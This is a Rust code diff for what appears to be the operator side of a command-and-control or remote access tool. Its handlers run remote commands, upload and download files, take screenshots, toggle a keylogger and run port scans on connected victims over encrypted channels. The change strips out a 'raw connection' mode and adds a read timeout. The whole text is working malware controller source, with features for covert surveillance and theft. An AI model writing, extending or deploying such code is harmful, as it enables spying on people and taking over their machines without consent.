@@ -217,7 +217,17 @@ pub async fn parse_client_info(
     let mut buffer = [0; 32];
 
     tcp_stream.write(&public_bytes).await.unwrap();
-    tcp_stream.read(&mut buffer).await.unwrap();
+    // set timeout of 1s for reading the public key from the client
+    let result = timeout(Duration::from_secs(1), tcp_stream.read(&mut buffer)).await;
+    match result {
+        Ok(Ok(_)) => {}
+        Ok(Err(err)) => {
+            panic!("Error reading from stream: {:?}", err);
+        }
+        Err(_) => {
+            return ("".to_string(), "".to_string(), secret.diffie_hellman(&public));
+        }
+    }
 
     let shared_secret = secret.diffie_hellman(&PublicKey::from(buffer));
     let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
@@ -242,8 +252,7 @@ pub async fn parse_client_info(
 }
 pub async fn handle_command(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
-    command: &str,
-    raw_connection: bool,
+    command: &str
 ) -> Result<String, String> {
     let parts: Vec<&str> = command.splitn(3, ' ').collect();
     if parts.len() < 3 {
@@ -271,12 +280,7 @@ pub async fn handle_command(
         "||CMDEXEC||"
     };
 
-    let command = if raw_connection {
-        format!("{}\n", command_str)
-    } else {
-        format!("{} {}", command_prefix, command_str)
-    };
-
+    let command = format!("{} {}", command_prefix, command_str);
     let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream
         .lock()
@@ -299,14 +303,10 @@ pub async fn handle_command(
         .await
         .expect("Error reading from stream");
     let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
-    if raw_connection {
-        cmdout = String::from_utf8(data.to_vec()).unwrap();
-    } else {
-        while !cmdout.contains("||cmd||") {
-            cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
-        }
-        cmdout = cmdout.replace("||cmd||", "");
+    while !cmdout.contains("||cmd||") {
+        cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
     }
+    cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
 pub async fn handle_list(
@@ -337,12 +337,8 @@ pub async fn handle_list(
 }
 pub async fn handle_upload(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
-    command: &str,
-    raw_connection: bool,
+    command: &str
 ) -> Result<String, String> {
-    if raw_connection {
-        return Err("Upload command not supported for raw connections".to_string());
-    }
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 4 {
         return Err("Invalid command, expected 'upload ID file destination'".to_string());
@@ -408,11 +404,7 @@ pub async fn handle_upload(
 pub async fn handle_download(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
-    raw_connection: bool,
 ) -> Result<String, String> {
-    if raw_connection {
-        return Err("Download command not supported for raw connections".to_string());
-    }
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 4 {
         return Err("Invalid command, expected 'download ID file destination'".to_string());
@@ -478,11 +470,7 @@ pub async fn handle_download(
 pub async fn handle_screenshot(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
-    raw_connection: bool,
 ) -> Result<String, String> {
-    if raw_connection {
-        return Err("Screenshot command not supported for raw connections".to_string());
-    }
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 2 {
         return Err("Invalid command, expected 'screenshot ID'".to_string());
@@ -523,11 +511,7 @@ static THREAD_HANDLE: Lazy<Arc<Mutex<Option<JoinHandle<Result<(), String>>>>>> =
 pub async fn handle_keylogger(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
-    raw_connection: bool,
 ) -> Result<String, String> {
-    if raw_connection {
-        return Err("Screenshot command not supported for raw connections".to_string());
-    }
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 3 {
         return Err("Invalid command, expected 'keylogger ID on/off'".to_string());
@@ -618,11 +602,7 @@ pub async fn handle_keylogger(
 pub async fn handle_port_scan(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
-    raw_connection: bool,
 ) -> Result<String, String> {
-    if raw_connection {
-        return Err("Port scan command not supported for raw connections".to_string());
-    }
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 5 {
         return Err("Invalid command, expected 'portscan ID ip start_port end_port'".to_string());
@@ -671,7 +651,6 @@ pub async fn handle_port_scan(
 pub async fn handle_kill(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
-    raw_connection: bool,
 ) -> Result<String, String> {
     let parts: Vec<&str> = command.split(" ").collect();
     let id: usize = match parts[1].trim().parse() {
@@ -698,22 +677,14 @@ pub async fn handle_kill(
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
 
-    if raw_connection {
-        stream
-            .lock()
-            .await
-            .write(b"exit\n")
-            .await
-            .expect("Error writing to stream");
-    } else {
-        let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
-        stream
-            .lock()
-            .await
-            .write(&cmd)
-            .await
-            .expect("Error writing to stream");
-    }
+    
+    let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
+    stream
+        .lock()
+        .await
+        .write(&cmd)
+        .await
+        .expect("Error writing to stream");
     stream
         .lock()
         .await
